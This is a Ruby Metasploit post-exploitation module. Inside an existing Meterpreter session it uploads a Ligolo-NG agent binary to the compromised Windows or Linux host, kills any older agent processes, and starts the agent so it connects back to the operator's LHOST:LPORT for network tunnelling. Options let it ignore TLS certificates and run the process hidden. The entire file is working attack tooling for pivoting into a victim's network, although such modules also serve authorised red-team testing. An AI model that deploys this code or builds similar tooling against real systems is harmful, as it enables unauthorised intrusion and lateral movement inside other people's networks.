##
# This module requires Metasploit Framework and a Meterpreter session.
# Save in /home/kali/.msf4/modules/post/multi/exec/ligolo_ng_agent.rb
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  require 'ipaddr'
  require 'socket'

  def get_tun0_ip
    begin
      Socket.getifaddrs.each do |iface|
        if iface.name == 'tun0' && iface.addr&.ipv4?
          return iface.addr.ip_address
        end
      end
    rescue
    end
    nil
  end

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Upload and Execute Ligolo-NG Agent',
      'Description'   => %q{
        Uploads and executes the Ligolo-NG agent binary (Windows or Linux)
        so it connects back to LHOST:LPORT. If IGNORE_CERT is true, adds
        the -ignore-cert flag. On Windows it uses cmd.exe start to detach
        the process and avoid file locks.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['x4v1l0k <x4v1l0k@gmail.com>'],
      'Platform'      => ['linux', 'windows'],
      'SessionTypes'  => ['meterpreter']
    ))

    register_options(
      [
        OptString.new('LHOST',       [true,  'IP or hostname for the reverse connection', get_tun0_ip || '0.0.0.0']),
        OptPort.new(  'LPORT',       [true,  'Port for the reverse connection', 444]),
        OptBool.new(  'IGNORE_CERT', [false, 'Ignore TLS certificate verification', true]),
        OptBool.new(   'HIDDEN',     [false, 'Run process hidden (no output)', false])
      ]
    )
  end

  def run
    unless session.type == 'meterpreter'
      print_error("[Session #{session.sid}] This module requires a Meterpreter session.")
      return
    end

    bin_name   = session.platform == 'windows' ? 'Agent_Windows_amd64.exe' : 'Agent_Linux_amd64'
    local_path = File.join(Msf::Config.data_directory, 'post', 'ligolo-ng', bin_name)
    unless File.file?(local_path)
      print_error("Binary not found at #{local_path}")
      return
    end

    if session.platform == 'windows'
      remote_dir  = session.fs.file.expand_path('%TEMP%')
      remote_path = "#{remote_dir}\\#{bin_name}"
    else
      remote_dir  = '/tmp'
      remote_path = "#{remote_dir}/#{bin_name}"
    end

    begin
      killed = false
      session.sys.process.get_processes.each do |p|
        if p['name'].downcase == bin_name.downcase
          session.sys.process.kill(p['pid'])
          print_status("[Session #{session.sid}] Killed existing Ligolo agent with PID #{p['pid']}")
          killed = true
        end
      end
      if killed
        Rex::sleep(1.5)
      end
    rescue ::Exception => e
    end

    begin
      session.fs.file.rm(remote_path)
      print_status("[Session #{session.sid}] Removed old binary at #{remote_path}")
    rescue ::Exception => e
    end

    print_status("[Session #{session.sid}] Uploading #{bin_name} to #{remote_path} ...")
    begin
      session.fs.file.upload(remote_path, local_path)
      print_good("[Session #{session.sid}] Binary uploaded successfully.")
    rescue ::Exception => e
      print_error("[Session #{session.sid}] Failed to upload Ligolo-NG agent: #{e.class} #{e}")
      return
    end

    if session.platform == 'windows'
      args = "-connect #{datastore['LHOST']}:#{datastore['LPORT']} -retry"
      args << ' -ignore-cert' if datastore['IGNORE_CERT']
      cmd  = "\"#{remote_path}\" #{args}"

      hidden = datastore['HIDDEN']
      print_status("[Session #{session.sid}] Launching Ligolo-NG agent on Windows (hidden: #{hidden})")

      begin
        proc = session.sys.process.execute(cmd, nil, 'Hidden' => hidden, 'Channelized' => !hidden)

        if !hidden
          Thread.new do
            begin
              loop do
                output = proc.channel.read
                break if output.nil? || output.empty?
                output.each_line do |line|
                  print_status("[Session #{session.sid}][Ligolo-NG Agent] #{line.strip}")
                end
              end
            rescue ::Exception => e
            end
          end
        end

        print_good("[Session #{session.sid}] Ligolo-NG agent started successfully.")
      rescue ::Exception => e
        print_error("[Session #{session.sid}] Error executing Ligolo-NG agent: #{e.class} #{e}")
      end
    else
      args = "-connect #{datastore['LHOST']}:#{datastore['LPORT']}"
      args << ' -ignore-cert' if datastore['IGNORE_CERT']
      cmd = "\"#{remote_path}\" #{args}"

      hidden = datastore['HIDDEN']
      cmd << " &" if hidden

      print_status("[Session #{session.sid}] Launching Ligolo-NG agent on Linux (hidden: #{hidden})")
      begin
        proc = session.sys.process.execute(cmd, nil, 'Hidden' => hidden, 'Channelized' => !hidden)

        if !hidden
          Thread.new do
            begin
              loop do
                output = proc.channel.read
                break if output.nil? || output.empty?
                output.each_line do |line|
                  print_status("[Session #{session.sid}][Ligolo-NG Agent] #{line.strip}")
                end
              end
            rescue ::Exception => e
            end
          end
        end

        print_good("[Session #{session.sid}] Ligolo-NG agent started successfully.")
      rescue ::Exception => e
        print_error("[Session #{session.sid}] Error executing Ligolo-NG agent: #{e.class} #{e}")
      end
    end
  end
end
